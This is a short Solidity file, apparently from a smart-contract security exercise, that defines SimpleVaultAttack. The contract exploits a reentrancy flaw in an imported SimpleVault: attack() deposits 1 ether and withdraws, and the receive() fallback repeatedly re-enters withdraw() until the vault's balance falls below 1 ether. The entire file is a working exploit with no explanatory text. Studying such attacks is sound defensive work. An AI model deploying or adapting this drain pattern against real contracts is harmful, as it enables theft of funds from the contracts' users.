// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {SimpleVault} from "./SimpleVault.sol"; 

contract SimpleVaultAttack {

  SimpleVault public target;

  constructor(SimpleVault _target) {
    target = _target;
  }

  receive() external payable {
    if (address(target).balance >= 1 ether) {
      target.withdraw();
    }
  }

  function attack() external payable {
    if (msg.value < 1 ether) {
      revert("Insufficient amount");
    }
    target.deposit{value: 1 ether}();
    target.withdraw();
  }
}
